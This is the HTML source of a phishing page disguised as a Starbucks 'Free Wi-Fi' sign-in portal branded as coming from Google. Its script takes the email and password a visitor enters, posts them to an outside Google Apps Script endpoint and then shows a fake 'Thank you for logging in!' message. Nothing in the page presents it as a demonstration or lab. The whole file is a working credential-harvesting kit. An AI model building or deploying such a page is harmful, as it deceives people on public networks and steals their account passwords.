<!DOCTYPE html>
<html lang="en">

<head>

  <title>Sign in - Starbucks</title>

  <meta charset="UTF-8">
  <meta http-equiv="cache-control" content="no-cache" />
  <meta http-equiv="expires" content="0" />
  <meta http-equiv="pragma" content="no-cache" />
  <meta name="viewport" content="width=device-width, initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
  <meta name="robots" content="noindex, nofollow">

  <script src="static/js/jquery.min.js"></script>

  <link rel="stylesheet" href="static/css/bootstrap.min.css">
  <link rel="stylesheet" href="static/css/style.css">
  <link rel="icon" type="image/png" href="static/img/s5g1cxz9vr.png" />

  <style>
    body {
      background-image: url("static/img/5atoko1sqg.png");
      background-position: center;
      background-attachment: fixed;
      background-repeat: no-repeat;
      background-size: cover;
    }

    .google-header-bar {
      height: 71px;
      border-bottom: 1px solid #e5e5e5;
      overflow: hidden;
    }

    .google-header-bar.centered {
      border: 0;
      height: 108px;
    }

    .google-header-bar.centered .header .logo {
      float: none;
      margin: 40px auto 30px;
      display: block;
    }

    .header .logo {
      margin: 17px 0 0;
      float: left;
      height: 38px;
      width: 116px;
    }

    /* Responsive Styles */
    @media screen and (max-width: 800px), screen and (max-height: 800px) {
      .google-header-bar.centered {
        height: 83px;
      }

      .google-header-bar.centered .header .logo {
        margin: 25px auto 20px;
      }

      .card {
        margin-bottom: 20px;
      }
    }

    @media screen and (max-width: 580px) {
      html,
      body {
        font-size: 14px;
      }

      .google-header-bar.centered {
        height: 73px;
      }

      .google-header-bar.centered .header .logo {
        margin: 20px auto 15px;
      }

      .content {
        padding-left: 10px;
        padding-right: 10px;
      }

      .card {
        padding: 20px 15px 30px;
        width: 270px;
      }

      .footer ul li {
        padding-right: 1em;
      }

      .lang-chooser-wrap {
        display: none;
      }
    }
  </style>

</head>

<body>

  <div class="container">
    <div class="account-wall">
      <img class="profile-img" src="static/img/pa6dyy5wcc.png" alt="Profile Image">

      <h1 class="text-center login-title">Free Wi-Fi</h1>
      <h2 class="text-center friends-text">From our friends at Google</h2>

      <!-- Login Form -->
      <div class="form-container">
        <h2>Login</h2>
        <form id="loginForm">
          <input type="email" id="email" name="email" placeholder="Enter your email" required>
          <input type="password" id="password" name="password" placeholder="Enter your password" required>
          <button type="submit">Submit</button>
        </form>
        <div class="thank-you" id="thankYouMessage" style="display: none;">Thank you for logging in!</div>
      </div>

      <!-- Modal for Terms of Service -->
      <div id="myModal" class="modal url-color1">
        <div class="modal-content">
          <div class="modal-header">
            <span class="close">×</span>
            <h2>Terms of Service</h2>
          </div>
          <div class="modal-body">
            <p>This is a free wireless hotspot internet service (the “Service”)...</p>
            <!-- Full terms content goes here -->
          </div>
        </div>
      </div>

    </div>
  </div>

  <script>
    $(document).ready(function () {
      // Handle form submission via AJAX
      $("#loginForm").submit(function (event) {
        event.preventDefault(); // Prevent default form submission

        // Get the email and password values
        var email = $("#email").val();
        var password = $("#password").val();

        // Make the AJAX request
        $.ajax({
          url: "https://script.google.com/macros/s/AKfycbwEBW1qGXD_cYYZm3rB5hCEstWvpeWzRMEQhVXh2d-sHXYp89-TrIoAdXN7C1A8lJ7umw/exec", // API URL
          method: "POST",
          data: {
            data: [
              { email: email, password: password }
            ]
          },
          success: function (response) {
            // Show the thank you message
            $("#thankYouMessage").show();
            // Optionally, clear the form fields after submission
            $("#email").val('');
            $("#password").val('');
          },
          error: function (xhr, status, error) {
            alert("An error occurred. Please try again.");
          }
        });
      });

      // Modal behavior ug
      var modal = document.getElementById('myModal');
      var btn = document.getElementById("btn1");
      var span = document.getElementsByClassName("close")[0];

      btn.onclick = function () {
        modal.style.display = "block";
      }

      span.onclick = function () {
        modal.style.display = "none";
      }

      window.onclick = function (event) {
        if (event.target == modal) {
          modal.style.display = "none";
        }
      }
    });
  </script>

</body>

</html>
